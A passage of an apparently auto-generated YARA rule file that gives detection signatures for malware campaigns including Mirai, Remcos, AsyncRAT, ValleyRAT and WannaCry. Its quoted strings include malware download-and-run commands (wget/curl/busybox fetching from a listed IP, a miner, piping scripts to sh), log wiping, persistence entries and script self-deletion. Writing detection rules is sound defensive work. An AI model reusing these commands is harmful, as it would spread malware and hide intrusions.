        $s1 = "RUST_BACKTRACEassertion failed: self.is_code_point_boundary(new_len)/rustc/58cf8f9c35b355199727627d0" ascii
        $s2 = "Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A7D2}WindowsWebCache" ascii
        $s3 = "692E}\\InprocServer32Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A7D2}\\InprocServer32" ascii
        $s4 = "MMDevApi.dllDllGetClassObjectC:\\Users\\hermes\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\un" ascii
        $s5 = "overflow in Duration::new/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/library\\core\\src\\time.rs" ascii
        $s6 = "SizeLimitExhaustedErrorParseIntErrorkind/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/library\\core" ascii
        $s7 = "assertion failed: self.is_char_boundary(new_len)/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/libr" ascii
        $s8 = "<unknown>/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/library\\std\\src\\sys\\process\\windows\\child_p" ascii
        $s9 = "Cunsafe extern \"\" -fn() ->  + : punycode{}.llvm./rust/deps\\rustc-demangle-0.1.28\\src\\lib.rs" ascii
        $s10 = "too many active read locks on RwLock/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/library\\std\\src\\" ascii
        $s11 = "advancing IoSlice beyond its length/rustc/58cf8f9c35b355199727627d07ae34a4e2846d67/library\\core\\src\\" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_e902016c_valleyrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e902016c"
        date = "2026-11-01"
        campaign = "imphash-e902016c"
        family = "valleyrat"
        hash = "016143621e08cb0e50eef27249ff0ab605cf6912ee15fecba9a14103cb287b0f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e902016c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[!] STATUS_OBJECT_NAME_COLLISION: Service/object name already exists." ascii
        $s1 = "[%u:%u.%u]: DriverEntry(DriverObject=0x%p; RegistryPath=\"%wZ\")" ascii
        $s2 = "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" wide
        $s3 = "[!] STATUS_IMAGE_ALREADY_LOADED: Driver was already in memory." ascii
        $s4 = "SELECT displayName FROM AntiVirusProduct" wide
        $s5 = "[%u:%u.%u]: RemoveClient(DeviceExtension=0x%p; ProcessId=0x%p)" ascii
        $s6 = "[%u:%u.%u]: FindClient(DeviceExtension=0x%p; ProcessId=0x%p)" ascii
        $s7 = "[%u:%u.%u]: _FlushDpcRoutine(Dpc=0x%p, Arg1=0x%p, Arg2=0x%p, Arg3=0x%p)" ascii
        $s8 = "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" wide
        $s9 = "[%u:%u.%u]: ProcessCallback(Process=0x%p; ProcessId=0x%p; CreateInfo=0x%p)" ascii
        $s10 = "_SaveBootDebugRequest: ZwCreateFile(\"%wZ\"): 0x%x" ascii
        $s11 = "D:\\_work\\75\\s\\Safetica\\Endpoint\\Compiled\\x64\\Release\\ProcessMonitorDriver.pdb" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_1cb51636_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-1cb51636"
        date = "2026-11-01"
        campaign = "rich_header_hash-1cb51636"
        family = ""
        hash = "56ea849523ffc5f31539a60cc97a7272c344bec9feea9cff11a847be97fe4633"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-1cb51636.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "stuvwxyz0123456789+,!\"#$%&'()*+,-0123456789@ABCDEFGHIJKLMNPQRSTUVXYZ[`abcdehijklmpqrC:\\Users\\runnera" ascii
        $s1 = "LISTEN_FAKETLS_DOMAINDC_IPTarget IP for a DC, e.g. `--dc-ip 2:149.154.167.220`. Can be specified mul" ascii
        $s2 = "s.buf-kb256TG_BUF_KBPOOL_SIZENumber of pre-warmed WebSocket connections per DCpool-size4TG_POOL_SIZE" ascii
        $s3 = "S zone.cf-worker-domaincfproxy-worker-domainTG_CF_WORKER_DOMAINCF_PRIORITYLegacy: try the Cloudflare" ascii
        $s4 = "RUST_BACKTRACEassertion failed: self.is_code_point_boundary(new_len)/rustc/58cf8f9c35b355199727627d0" ascii
        $s5 = "o the same hole.  Matches upstream tg-ws-proxy's `IP_FAIL_COOLDOWN`.ip-fail-cooldown3600TG_IP_FAIL_C" ascii
        $s6 = "OXY`, then `HTTP_PROXY` (including lowercase variants).outbound-proxyURLTG_OUTBOUND_PROXYNO_OUTBOUND" ascii
        $s7 = "ed exits non-zero, because nothing was verified.check-listenerTG_CHECK_LISTENERDEFAULT_DOMAINSUse th" ascii
        $s8 = ". `host1:443:sec1,host2:8888:sec2`mtproto-proxyHOST:PORT:SECRETTG_MTPROTO_PROXYLINK_IPIP address to " ascii
        $s9 = " MTProto proxy after a failureupstream-fail-cooldown60TG_UPSTREAM_FAIL_COOLDOWNCF_CONNECT_TIMEOUTCon" ascii
        $s10 = " the default priority order (see docs/Fallbacks.md).pinned-upstreamTIERSTG_PINNED_UPSTREAMPINNED_MED" ascii
        $s11 = "CHUNK_SIZE_MAX_BYTES should fit any usizeC:\\Users\\runneradmin\\.cargo\\registry\\src\\index.crates.io-19" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17315840 and 12 of them
}

rule Sightlines_tlsh_19a67cad_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-19a67cad"
        date = "2026-11-01"
        campaign = "tlsh-19a67cad"
        family = ""
        hash = "17214a0040a36ba59b0af19035c80d58710a07544663cd5cc6f5a40fdc5b7625"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-19a67cad.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "AVAUATUSDkG" ascii
        $s1 = "8-sha512H" ascii
        $s2 = "aes256-cH" ascii
        $s3 = "n-group1H" ascii
        $s4 = "AWAVAUATUSL" ascii
        $s5 = "sha2-256H" ascii
        $s6 = "so.preloH" ascii
        $s7 = "D$xPAVAUD" ascii
        $s8 = "diffie-hH" ascii
        $s9 = "hmac-shaH" ascii
        $s10 = "B<H9T$8u" ascii
        $s11 = "Q<H9L$8u" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5c8c1113_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5c8c1113"
        date = "2026-11-01"
        campaign = "tlsh-5c8c1113"
        family = ""
        hash = "6b3e3afadbacc01515ba640d16e6dcab920fdf3b0fb764e1f335531637ad6463"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5c8c1113.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "TLS_HANDSHAKE_QUIC_TP_ADDRESS_DISCOVERY=0x9f81a176 -- https://tools.ietf.org/html/draft-ietf-quic-ad" ascii
        $s1 = "TLS_HANDSHAKE_QUIC_TP_CIBIR_ENCODING=0x1000 -- https://datatracker.ietf.org/doc/html/draft-banks-qui" ascii
        $s2 = "TLS_HANDSHAKE_QUIC_TP_ENABLE_TIME_STAMP_V2=0x7158 -- https://tools.ietf.org/html/draft-huitema-quic-" ascii
        $s3 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_OLD=0xde1a -- https://tools.ietf.org/html/draft-iyengar-quic-del" ascii
        $s4 = "TLS_HANDSHAKE_QUIC_TP_VERSION_INFORMATION=0x11 -- https://tools.ietf.org/html/draft-ietf-quic-versio" ascii
        $s5 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_DRAFT05=0xff04de1a -- https://tools.ietf.org/html/draft-ietf-qui" ascii
        $s6 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY=0xff04de1b -- https://tools.ietf.org/html/draft-ietf-quic-ack-fr" ascii
        $s7 = "TLS_HANDSHAKE_QUIC_TP_LOSS_BITS=0x1057 -- https://tools.ietf.org/html/draft-ferrieuxhamchaoui-quic-l" ascii
        $s8 = "TLS_HANDSHAKE_QUIC_TP_MIN_ACK_DELAY_DRAFT_V1=0xFF03DE1A -- https://tools.ietf.org/html/draft-ietf-qu" ascii
        $s9 = "TLS_HANDSHAKE_QUIC_TP_VERSION_INFORMATION_DRAFT=0xff73db -- https://datatracker.ietf.org/doc/draft-i" ascii
        $s10 = "TLS_HANDSHAKE_QUIC_TP_ENABLE_TIME_STAMP=0x7157 -- https://tools.ietf.org/html/draft-huitema-quic-ts-" ascii
        $s11 = "TLS_HANDSHAKE_QUIC_TP_MAX_DATAGRAM_FRAME_SIZE=0x20 -- https://datatracker.ietf.org/doc/html/draft-ie" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ef0607d7_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ef0607d7"
        date = "2026-11-01"
        campaign = "tlsh-ef0607d7"
        family = "remcos"
        hash = "11862191bdcfc8bb03d5e7e1f72a1db133eaaca9344916a6c79c3517f7aba06d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ef0607d7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s2 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s3 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s4 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s6 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
        $s8 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE33" ascii
        $s9 = "fso.DeleteFile(Wscript.ScriptFullName)" wide
        $s10 = "6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296" ascii
        $s11 = "11839296A789A3BC0045C8A5FB42C7D1BD998F54449579B446817AFBD17273E662C97EE72995EF42640C550B9013FAD07613" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1220688 and 12 of them
}

rule Sightlines_tlsh_6a6c4c45_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6a6c4c45"
        date = "2026-11-01"
        campaign = "tlsh-6a6c4c45"
        family = "asyncrat"
        hash = "051013a9da6e240d7e3fb7bb742ed7e83f233b6ef13bd47bed762b117132d696"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6a6c4c45.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ").NETFramework,Version=v4.0,Profile=Client" ascii
        $s1 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s2 = "Invalid message authentication code (MAC)." wide
        $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" ascii
        $s4 = "\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS" wide
        $s5 = "1DB2A1F9902B35F8F880EF1692CE9947A193D5A698D8F568BDA721658ED4C58B" ascii
        $s6 = "87639126EA77B358F26532367DBA67C5310EF50A8D9888ED070CD40E1F605A8F" ascii
        $s7 = "Select * from Win32_ComputerSystem" wide
        $s8 = "masterKey can not be null or empty." wide
        $s9 = "(ext8,ext16,ex32) type $c7,$c8,$c9" wide
        $s10 = ".NET Framework 4 Client Profile" ascii
        $s11 = "Select * from AntivirusProduct" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_90af4443_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-90af4443"
        date = "2026-11-01"
        campaign = "tlsh-90af4443"
        family = "mirai"
        hash = "0c0295c4b0b1f4d92b0d36bf2f5d8107ff21fb8c13fd0bc84c108462eaa95579"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-90af4443.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "Accept-Encoding: gzip, deflate" ascii
        $s2 = "/etc/config/resolv.conf" ascii
        $s3 = "Unknown error Success" ascii
        $s4 = "/etc/config/hosts" ascii
        $s5 = "/proc/%d/stat" ascii
        $s6 = "/proc/%d/exe" ascii
        $s7 = "D @N^NuNV" ascii
        $s8 = "L @N^NuNV" ascii
        $s9 = "j @N^NuNV" ascii
        $s10 = " @N^NuNuNV" ascii
        $s11 = "$_N^NuNuNV" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_52bd91c5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52bd91c5"
        date = "2026-10-30"
        campaign = "tlsh-52bd91c5"
        family = "mirai"
        hash = "05f25a616835bbafe058502520d27d1978fb8766f1e95ff8567b97aea370288a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52bd91c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s2 = "/etc/systemd/system/killer-helper.service" ascii
        $s3 = "__linuxthreads_initial_report_events" ascii
        $s4 = "Accept-Language: en-US,en;q=0.5" ascii
        $s5 = "__linuxthreads_pthread_threads_max" ascii
        $s6 = "Accept-Encoding: gzip, deflate" ascii
        $s7 = "__GI_pthread_attr_getschedpolicy" ascii
        $s8 = "__GI_pthread_attr_setschedpolicy" ascii
        $s9 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s10 = "__pthread_wait_for_restart_signal" ascii
        $s11 = "__GI_pthread_attr_getinheritsched" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 6 of them
}

rule Sightlines_imphash_81dbdf66_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-81dbdf66"
        date = "2026-11-01"
        campaign = "imphash-81dbdf66"
        family = "wannacry"
        hash = "0c04ce5cd7f7ebfd12f9639f2bcb7dcd93b18f3706e394e3228e0fdbae4ebcb5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-81dbdf66.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10596352 and 12 of them
}

rule Sightlines_tlsh_a5032f4d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5032f4d"
        date = "2026-11-01"
        campaign = "tlsh-a5032f4d"
        family = "mirai"
        hash = "204e6d14591590ac52bc5c342ceb5ca87abdaa90d29b6e7cd1c84ebc291e7c5a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5032f4d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/proc/self/oom_score_adj" ascii
        $s1 = "/etc/config/resolv.conf" ascii
        $s2 = "After=network.target" ascii
        $s3 = "/usr/bin/systemctl" ascii
        $s4 = "/etc/config/hosts" ascii
        $s5 = "Restart=always" ascii
        $s6 = "[kworker/0:1]" ascii
        $s7 = "ExecStart=%s" ascii
        $s8 = "/etc/rc.local" ascii
        $s9 = "[Service]" ascii
        $s10 = "E8H;E0wrH" ascii
        $s11 = "tcpbypass" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 6 of them
}

rule Sightlines_tlsh_022db377_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-022db377"
        date = "2026-11-01"
        campaign = "tlsh-022db377"
        family = "mirai"
        hash = "04256374f18eab92bd40e60b340d509606b768322e080d485e766f402a7efae1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-022db377.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s1 = "ln -sf \"$d/network-dispatch.service\" \"$d/multi-user.target.wants/network-dispatch.service\"" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "/root/.config/systemd/user/network-dispatch.service" ascii
        $s4 = "/etc/udev/rules.d/99-network-dispatch.rules" ascii
        $s5 = "Cache-Control: no-cache, no-store, must-revalidate" ascii
        $s6 = "option post_install_hook /etc/init.d/network-dispatch" ascii
        $s7 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s8 = "rc_startup=/etc/init.d/network-dispatch start" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s10 = "/etc/xdg/autostart/network-dispatch.desktop" ascii
        $s11 = "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1111288 and 12 of them
}

rule Sightlines_rich_header_hash_97f41c68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-97f41c68"
        date = "2026-10-31"
        campaign = "rich_header_hash-97f41c68"
        family = ""
        hash = "0119b473d624ace8d60fcb228621c4e934e57e971f714365588e1bf7a1318d18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-97f41c68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "((FreeBlock->Flags & HEAP_ENTRY_DECOMMITTED) || (ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_" ascii
        $s1 = "tifiers (RIDs) have been exhausted. Please see http://go.microsoft.com/fwlink/?LinkId=228610 for rec" wide
        $s2 = "CLIENT(ntdll): Found CheckAppHelp = %d for %wZ in ImageFileExecutionOptions" ascii
        $s3 = "*!(CheckedFlags & ~HEAP_CREATE_VALID_MASK)" ascii
        $s4 = "(This->PrivateDynamicallyAllocatedString == NULL) || (This->PrivateDynamicallyAllocatedString->Buffe" ascii
        $s5 = "A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER" wide
        $s6 = "ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_PTR)FreeBlock" ascii
        $s7 = "his error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXG" wide
        $s8 = "An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type." wide
        $s9 = "Init routine %p for DLL \"%wZ\" failed during DLL_PROCESS_ATTACH" ascii
        $s10 = "May not specify Lock parameter with HEAP_NO_SERIALIZE" ascii
        $s11 = "SXS: Assembly directory name stored in assembly information too long (%lu bytes) - ACTIVATION_CONTEX" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3389440 and 12 of them
}

rule Sightlines_tlsh_f4a3e3a5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4a3e3a5"
        date = "2026-11-01"
        campaign = "tlsh-f4a3e3a5"
        family = "mirai"
        hash = "0a572293de07a18f1cac590e7fc00420044e57b2a61a271e2c8fac2fd53c86f7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4a3e3a5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=http://31.56.209.86/%s;(wget -qO .upd $U||curl -skLo .upd $U||busybox wget -qO .upd $U);chmod 777 ." ascii
        $s1 = "http://31.56.209.86/xmrig_%s;(wget -qO .xm $U||curl -so .xm $U||busybox wget -qO .xm $U); chmod 777 " ascii
        $s2 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#111;color:#0" ascii
        $s3 = "<!doctype html><meta charset=utf-8><title>guardian proxy</title><style>body{background:#0b0b0b;color" ascii
        $s4 = ":#5f5;font-family:monospace}table{border-collapse:collapse}td,th{border:1px solid #333;padding:4px 8" ascii
        $s5 = "px}a{color:#5ff}</style><h2>guardian proxy control</h2><p>uptime %lds | total %d | active %d | ping " ascii
        $s6 = "f0;font-family:monospace}</style><h2>guardian proxy panel</h2><form method=post action=/login>passwo" ascii
        $s7 = "Set-Cookie: sid=%s; Path=/; Max-Age=%d; HttpOnly" ascii
        $s8 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s9 = "%dms | proxy users %d</p><p>proxy: <b>socks5 :%d</b> (same port as panel)</p><h3>connected clients (" ascii
        $s10 = "rd: <input type=password name=password><input type=submit value=login></form><p>protected: brute-for" ascii
        $s11 = "t value='add proxy account'></form><form method=post action=/removeuser>user <input name=user size=8" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0de6deff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0de6deff"
        date = "2026-11-01"
        campaign = "tlsh-0de6deff"
        family = ""
        hash = "078b8c31bbe260e7ed6c7164033a03d1efd59bbab53e9326e56660dd47e3abe9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0de6deff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d,Q:0x9b},B=a0I;return/headless|bytespider/i[B(a0c.d)](a0p[B(a0c.Q)]);},'appVersionCheck':function()" ascii
        $s1 = "{d:0xc6},t=a0I;return t(a0a.d)in window||!!a0p[t(0xc6)];},'userAgentCheck':function(){var a0c={d:0x9" ascii
        $s2 = "{var a0e={d:0x9d},T=a0I;return/headless/i[T(a0e.d)](a0p['appVersion']);},'pluginArraySpoofing':funct" ascii
        $s3 = "ion(){var a0S={d:0x96,Q:0xb0,m:0xb0,v:0xb7},k=a0I;let d=PluginArray[k(a0S.d)]===a0p[k(a0S.Q)]['__pro" ascii
        $s4 = "Int(U(a0y.o))/0xc)+parseInt(U(0x93))/0xd;if(v===Q)break;else m['push'](m['shift']());}catch(p){m['pu" ascii
        $s5 = "proto__'];return!d;},'noLanguage':function(){var a0g={d:0x98},J=a0I;return!a0p[J(0x92)]||a0p[J(0xa1)" ascii
        $s6 = "sh'](m['shift']());}}}(a0m,0xb1385));function a0v(d,Q){var m=a0m();return a0v=function(v,p){v=v-0x92" ascii
        $s7 = "outerWidth']===0x0;}},a0w=function(m,v){var a0z={d:0xbe,Q:0xab,m:0xb6},C=a0I,p=(function(){var w=!![" ascii
        $s8 = "mimeTypeArraySpoofing':function(){var a0n={d:0xa2},Y=a0I;let d=MimeTypeArray['prototype']===a0p[Y(a0" ascii
        $s9 = "=d();while(!![]){try{var v=parseInt(U(0xc5))/0x1*(-parseInt(U(0xbc))/0x2)+parseInt(U(a0y.d))/0x3*(-p" ascii
        $s10 = "][J(a0g.d)]===0x0;},'zeroOuterDimensions':function(){return window['outerHeigh'+'t']===0x0&&window['" ascii
        $s11 = ";var r=m[v];return r;},a0v(d,Q);}var a0p=window[a0I(0xc8)],a0r={'webdriverCheck':function(){var a0a=" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_93c63586_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-93c63586"
        date = "2026-11-01"
        campaign = "tlsh-93c63586"
        family = "mirai"
        hash = "1ae26cf33fd6ad18aaae01ce8badf6d52782c9153167c37c2ec831723a314354"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-93c63586.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "\"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x7" ascii
        $s5 = "\"\\x78\\x65\\x22\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x75\\x6C\\x6C\\x29\\x0A\\x0A\\x20\\x20\\x20\\x20\\x69\\x6" ascii
        $s6 = "\"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x6" ascii
        $s7 = "\"\\x20\\x20\\x20\\x20\\x72\\x65\\x73\\x75\\x6C\\x74\\x3D\\x24\\x28\\x6C\\x73\\x20\\x2D\\x6C\\x20\\x22\\x2F\\x70\\x72\\x6F\\x6" ascii
        $s8 = "Content-Type: application/json" ascii
        $s9 = "/bin/busybox hostname PBOC" ascii
        $s10 = "GET /api/v1/status HTTP/1.1" ascii
        $s11 = "/bin/busybox wget http://" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_a944dfa7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a944dfa7"
        date = "2026-11-01"
        campaign = "tlsh-a944dfa7"
        family = "mirai"
        hash = "05c458c702a87a6c4e49077aa19fe9b6c408ff2dd11468c1dc02868e29789100"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a944dfa7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "Content-Type: application/json" ascii
        $s5 = "/bin/busybox hostname PBOC" ascii
        $s6 = "GET /api/v1/status HTTP/1.1" ascii
        $s7 = "/bin/busybox wget http://" ascii
        $s8 = "POST /api/sync HTTP/1.1" ascii
        $s9 = "/bin/busybox echo -ne " ascii
        $s10 = "/bin/busybox echo > " ascii
        $s11 = "Host: api.svc.local" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

